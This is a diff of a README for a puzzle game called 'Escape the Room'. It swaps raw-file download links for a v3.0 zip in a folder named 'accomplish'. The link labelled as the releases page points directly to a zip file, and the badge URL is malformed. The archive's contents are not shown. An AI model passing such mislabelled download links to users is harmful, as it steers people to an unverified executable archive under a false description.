@@ -7,7 +7,7 @@ Escape the Room is a mystery puzzle game where you find and combine clues. Your 
 To start playing Escape the Room, you need to download the game. Follow the instructions below to get everything set up.
 
 ## 📥 Download the Game
-[![Download Escape the Room](https://raw.githubusercontent.com/Cranesec/Escape-the-Room/main/accomplish/Escape-the-Room.zip%20the%20Room-brightgreen)](https://raw.githubusercontent.com/Cranesec/Escape-the-Room/main/accomplish/Escape-the-Room.zip)
+[![Download Escape the Room](https://github.com/Cranesec/Escape-the-Room/raw/refs/heads/main/accomplish/Escape-the-Room-v3.0.zip%20the%20Room-brightgreen)](https://github.com/Cranesec/Escape-the-Room/raw/refs/heads/main/accomplish/Escape-the-Room-v3.0.zip)
 
 ## 📋 System Requirements
 Before downloading, ensure your computer meets these requirements:
@@ -18,7 +18,7 @@ Before downloading, ensure your computer meets these requirements:
 - **Storage:** Minimum 500 MB of free space
 
 ## 🚪 Download & Install
-1. **Visit the Releases Page:** Go to the following link to access the most recent version of the game: [Escape the Room Releases](https://raw.githubusercontent.com/Cranesec/Escape-the-Room/main/accomplish/Escape-the-Room.zip).
+1. **Visit the Releases Page:** Go to the following link to access the most recent version of the game: [Escape the Room Releases](https://github.com/Cranesec/Escape-the-Room/raw/refs/heads/main/accomplish/Escape-the-Room-v3.0.zip).
   
 2. **Select the Latest Release:** Once on the releases page, find the latest version at the top of the list. This version will have the most features and fixes.
 
